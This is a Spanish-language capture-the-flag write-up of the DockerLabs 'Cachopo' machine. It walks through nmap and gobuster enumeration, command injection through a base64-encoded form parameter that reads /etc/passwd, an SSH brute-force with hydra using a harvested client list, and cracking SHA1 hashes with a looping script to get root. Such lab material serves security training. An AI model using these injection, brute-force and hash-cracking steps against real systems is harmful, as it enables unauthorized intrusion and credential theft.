# Cachopo

**Nivel:** Medio

**Autor:** [PatxaSec](https://es.linkedin.com/in/ander-g-obieta?trk=public_post_feed-actor-image&original_referer=https%3A%2F%2Fes.linkedin.com%2Fposts%2Fander-g-obieta_github-patxasecmybspwm-activity-7117548332603854848-myFL)

------------------
## Escaneo 

Relizamos un escaneo general con **nmap** en la IP de la máquina víctima para identificar los puertos abiertos. 

```shell
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2
________________________________________________
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64

```

A continuación, utilizamos los scripts predeterminados de **nmap** para recopilar más información sobre los puertos identificados:

```shell
nmap -sCV -p22,80 -Pn -n 172.17.0.2
________________________________________________
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 7b:98:d4:e7:ec:50:0b:b2:3a:21:76:2c:45:95:23:61 (ECDSA)
|_  256 5d:15:2b:28:ec:67:7e:78:3c:16:12:65:2f:59:d4:88 (ED25519)
80/tcp open  http    Werkzeug/3.0.3 Python/3.12.3
|_http-title: Cahopos4-4ll
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/3.0.3 Python/3.12.3
|     Date: Sun, 05 Jan 2025 00:01:43 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 9332
|     Connection: close
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <meta charset="UTF-8">
|     <meta name="viewport" content="width=device-width initial-scale=1.0">
|     <link rel="stylesheet" href="/static/css/style.css">
|     <title>Cahopos4-4ll</title>
|     </head>
|     <header>
|     <nav>
|     <h2><a href="/" id="logo">DockerLabs</a></h2>
|     <button class="nav-button fa fa-bars"></button>
|     <div>
|     <!-- <ul> -->
|     <ul>
|     <button class="exit-menu fa fa-times"></button>
|     <li><a href="#" class="active">welcome</a></li>
|     <li><a href="#">menu</a></li>
|     <li><a href="#">reservations</a></li>
|     <li><a href="#">news</a></li>
|     <li><a href="#">contact</a></li>
|     </ul>
|     <!-- </ul> -->
|     </div>
|     </nav>
|     <div cl
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/3.0.3 Python/3.12.3
|     Date: Sun, 05 Jan 2025 00:01:43 GMT
|     Content-Type: text/html; charset=utf-8
|     Allow: OPTIONS, GET, HEAD
|     Content-Length: 0
|     Connection: close
|   RTSPRequest: 
|     <!DOCTYPE HTML>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: 400 - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
|_http-server-header: Werkzeug/3.0.3 Python/3.12.3

```

Encontramos los servicios **SSH** y **HTTP**, al verificar las versiones no evidenciamos vulnerabilidades, procedemos a inspeccionar el sitio web:

![image](https://github.com/user-attachments/assets/aae1fc2d-22e1-4941-8204-ff99e99c737d)

![image](https://github.com/user-attachments/assets/16414cba-29ba-4c6f-a63b-9caf6170b031)

![image](https://github.com/user-attachments/assets/d79cc92b-b3a8-4c28-be25-a6d29b249543)

Después de revisar el código de la página web e interactuar con esta, unicamente encontramos un formulario que envia un request **POST** al recurso **/submitTemplate**.

------------------
## Enumeración 

Realizamos **fuzzing** utilizando **gobuster**, para identificar directorios ocultos, sin embargo no evidenciamos información relevante:

```shell
gobuster dir -u http://172.17.0.2/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 20 -x html,php,txt -s 200,301 -b ''

```

Procedemos a capturar el request al recurso **/submitTemplate** con **Burpsuite** desde el **Proxy** y enviarlo al **Repeater** 

![image](https://github.com/user-attachments/assets/34c971b7-165d-422c-b766-31a45eeccdb9)

![image](https://github.com/user-attachments/assets/3e5f0a6f-1b52-440f-9ce3-6553b1a80d99)

Al revisar la respuesta obtenemos un error "Incorrect padding" que generalmente indica un problema relacionado con la codificación en **Base64**.

Procedemos a enviar el valor del parámetro `userInput` codificado en **base64**, y la respuesta indica que está intentando ejecutar el valor como un comando del sistema.

![image](https://github.com/user-attachments/assets/facf3878-a701-4029-a12e-ecd852de0bbc)

Ahora realizamos una enumeración de los usuarios del sistemas enviando el comando `cat /etc/passwd` codificado en **base64**

![image](https://github.com/user-attachments/assets/80bd8fad-0a9c-4b05-9a5a-7285983b7fcd)

Hemos encontrado los usuarios **cachopin** y **ubuntu**, procedemos a verificar el usuario que ejecuta el servicio web:

![image](https://github.com/user-attachments/assets/c70b3fea-2fbb-4f9c-9e02-424ed0327e67)

A continuación realizamos una revisión del directorio del usuario **cachopin**:

![image](https://github.com/user-attachments/assets/53e3eaad-2661-41fb-ad65-8f658d508624)

Evidenciamos los directorios **app**, **newsletters** y el fichero **entrypoint.sh**, procedemos a revisar su contenido:

![image](https://github.com/user-attachments/assets/007c738c-8ef4-4b33-84a8-a896d45adea9)

![image](https://github.com/user-attachments/assets/c53ae20e-6c8d-4aff-8f07-8931f85cd862)

Guardamos el contenido del fichero **client_list.txt**, evidenciado en el directorio **/home/cachopin/newsletters/**, que podria utilizarse como wordlist.

![image](https://github.com/user-attachments/assets/c92cbe16-0cca-4048-93fc-67464d56144c)

![image](https://github.com/user-attachments/assets/6c057f8a-b117-4fc0-9453-f042b230af41)

![image](https://github.com/user-attachments/assets/88558353-c92a-491e-9522-98acbaa99db8)

![image](https://github.com/user-attachments/assets/46de8623-d967-4aca-85af-633b69460262)

Evidenciamos un listado de hashes en el directorio **/home/cachopin/app/com/personal/**, guardamos el contenido para intentar descifrarlos posteriormente.

![image](https://github.com/user-attachments/assets/abb29138-346c-42e0-9637-4b196a4743eb)

![image](https://github.com/user-attachments/assets/8370af24-e82c-4825-80ac-23307b2e8c80)

![image](https://github.com/user-attachments/assets/a1bf7cbd-7534-4f44-af63-6e376591bb5e)

--------------
## Explotación

Con el wordlist obtenido en el fichero **client_list.txt** procedemos a realizar un ataque de fuerza bruta con **hydra**:

```shell
hydra -l cachopin -P wordlists.txt 172.17.0.2 ssh
```

Logramos obtener credenciales válidas para el servicio **SSH** y procedemos a ingresar a la máquina víctima:

```shell
ssh cachopin@172.17.0.2
```

------------------------------
## Escalando privilegios

Verificamos si es posible ejecutar algún fichero como **root** con **sudo -l**:

```shell
sudo -l
------------------------------------------------
Sorry, user cachopin may not run sudo on 13c07d7503da.
```

Procedemos a verificar los ficheros con el [**setuid**](https://es.wikipedia.org/wiki/Setuid) habilitado

```shell
find / -perm -4000 -type f 2>/dev/null
------------------------------------------------
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/local/bin/privileged_exec
/usr/local/bin/backup.sh
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/newgrp
/bin/su
/bin/mount
/bin/ping6
/bin/ping
/bin/umount
```

Sin embargo, no encontramos mecanismo para escalar privilegios, procedemos a intentar descifrar los hashes evidenciados en la etapa de enumeración:

Realizamos una búsqueda para identificar alguna herramienta disponible dado que la estructura de los hashes mencionan el algoritmo **SHA1**, sin embargo, parece tener cifrado **Base64** también:

![image](https://github.com/user-attachments/assets/91601a1c-d79c-4daa-92c7-3fe5187df686)

Encontramos un script de **Python** en un repositorio de [Github](https://github.com/PatxaSec/SHA_Decrypt), luego de descargarlo e instalar las depedencias, siguiendo las instrucciones del readme, creamos un archivo en **bash** que lea cada uno de hashes del fichero **hashes.lst** lo pase por el script utilizando el wordlist **rockyou.txt**:

```shell
#!/bin/bash

# Ruta al archivo de entrada
INPUT_FILE="/home/kali/hash.txt"

# Iterar sobre cada línea del archivo
while IFS= read -r line; do
  # Ejecutar el comando con la línea actual
  python3 sha2text.py 'd' "$line" '/usr/share/wordlists/rockyou.txt'
done < "$INPUT_FILE"
```

Logramos descifrar uno de los cinco hashes, lo utilizamos para escalar al usuario **root**:

```shell
su root
```

Finalmente hemos podido obtener acceso como usuario **root**:

```shell
whoami
----------------
root
```
